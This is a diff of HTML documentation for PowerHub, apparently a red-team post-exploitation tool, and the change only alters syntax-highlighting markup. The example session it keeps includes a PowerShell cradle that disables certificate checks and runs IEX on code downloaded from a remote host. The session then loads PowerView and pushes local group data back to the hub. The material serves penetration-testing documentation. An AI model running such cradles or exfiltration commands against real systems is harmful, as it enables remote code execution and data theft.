@@ -114,21 +114,21 @@ interface. PowerHub also helps with collaboration in case you’re a small
 team.</p>
 <p>Here is a simple example (grab information about local groups with PowerView
 and transfer it back):</p>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">avollmer</span><span class="p">&gt;</span> <span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span><span class="p">={</span><span class="nv">$true</span><span class="p">};</span><span class="nv">$Nxois</span><span class="p">=</span><span class="s1">&#39;bZeVBC4vZfakT5SmCcaFam6IRY6UNLnC&#39;</span><span class="p">;</span><span class="nv">$Plukgmio</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">;</span><span class="nb">IEX </span><span class="nv">$Plukgmio</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://192.168.11.2:8443/&#39;</span><span class="p">)</span>
-  <span class="n">_____</span>   <span class="n">_____</span>  <span class="n">_</span>  <span class="n">_</span>  <span class="n">_</span> <span class="n">_______</span>  <span class="n">______</span> <span class="n">_</span>     <span class="n">_</span> <span class="n">_</span>     <span class="n">_</span> <span class="n">______</span>
- <span class="p">|</span><span class="n">_____</span><span class="p">]</span> <span class="p">|</span>     <span class="p">|</span> <span class="p">|</span>  <span class="p">|</span>  <span class="p">|</span> <span class="p">|</span><span class="n">______</span> <span class="p">|</span><span class="n">_____</span><span class="p">/</span> <span class="p">|</span><span class="n">_____</span><span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> <span class="p">|</span><span class="n">_____</span><span class="p">]</span>
- <span class="p">|</span>       <span class="p">|</span><span class="n">_____</span><span class="p">|</span> <span class="p">|</span><span class="n">__</span><span class="p">|</span><span class="n">__</span><span class="p">|</span> <span class="p">|</span><span class="n">______</span> <span class="p">|</span>    <span class="p">\</span><span class="n">_</span> <span class="p">|</span>     <span class="p">|</span> <span class="p">|</span><span class="n">_____</span><span class="p">|</span> <span class="p">|</span><span class="n">_____</span><span class="p">]</span>
-<span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span>                       <span class="n">written</span> <span class="n">by</span> <span class="n">Adrian</span> <span class="n">Vollmer</span><span class="p">,</span> <span class="n">2018</span><span class="p">-</span><span class="n">202</span>
-<span class="n">Run</span> <span class="s1">&#39;Help-PowerHub&#39;</span> <span class="k">for</span> <span class="n">help</span>
-<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">avollmer</span><span class="p">&gt;</span> <span class="nb">Get-HubModule</span> <span class="n">PowerView</span>
+<div class="highlight-ps1con notranslate"><div class="highlight"><pre><span></span><span class="gp">PS C:\Users\avollmer&gt; </span><span class="no">[System.Net.ServicePointManager]</span><span class="p">::</span><span class="n">ServerCertificateValidationCallback</span><span class="p">={</span><span class="nv">$true</span><span class="p">};</span><span class="nv">$Nxois</span><span class="p">=</span><span class="s1">&#39;bZeVBC4vZfakT5SmCcaFam6IRY6UNLnC&#39;</span><span class="p">;</span><span class="nv">$Plukgmio</span><span class="p">=</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">;</span><span class="nb">IEX </span><span class="nv">$Plukgmio</span><span class="p">.</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://192.168.11.2:8443/&#39;</span><span class="p">)</span>
+<span class="go">  _____   _____  _  _  _ _______  ______ _     _ _     _ ______</span>
+<span class="go"> |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]</span>
+<span class="go"> |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]</span>
+<span class="go">2.0.0                       written by Adrian Vollmer, 2018-202</span>
+<span class="go">Run &#39;Help-PowerHub&#39; for help</span>
+<span class="gp">PS C:\Users\avollmer&gt; </span><span class="nb">Get-HubModule</span> <span class="n">PowerView</span>
 
-<span class="n">Name</span>   <span class="p">:</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="n">avollmer</span><span class="p">/.</span><span class="n">local</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">powerhub</span><span class="p">/</span><span class="n">modules</span><span class="p">/</span><span class="n">PowerSploit</span><span class="p">/</span><span class="n">Recon</span><span class="p">/</span><span class="n">PowerView</span><span class="p">.</span><span class="n">ps1</span>
-<span class="nb">Type </span>  <span class="p">:</span> <span class="n">ps1</span>
-<span class="n">N</span>      <span class="p">:</span> <span class="n">205</span>
-<span class="n">Loaded</span> <span class="p">:</span> <span class="n">True</span>
-<span class="k">Alias</span>  <span class="p">:</span>
+<span class="go">Name   : /home/avollmer/.local/share/powerhub/modules/PowerSploit/Recon/PowerView.ps1</span>
+<span class="go">Type   : ps1</span>
+<span class="go">N      : 205</span>
+<span class="go">Loaded : True</span>
+<span class="go">Alias  :</span>
 
-<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">avollmer</span><span class="p">&gt;</span> <span class="nb">Get-LocalGroup</span> <span class="p">|</span> <span class="n">PushTo-Hub</span> <span class="n">-Name</span> <span class="n">groups</span><span class="p">.</span><span class="n">json</span>
+<span class="gp">PS C:\Users\avollmer&gt; </span><span class="nb">Get-LocalGroup</span> <span class="p">|</span> <span class="n">PushTo-Hub</span> <span class="n">-Name</span> <span class="n">groups</span><span class="p">.</span><span class="n">json</span>
 </pre></div>
 </div>
 </section>
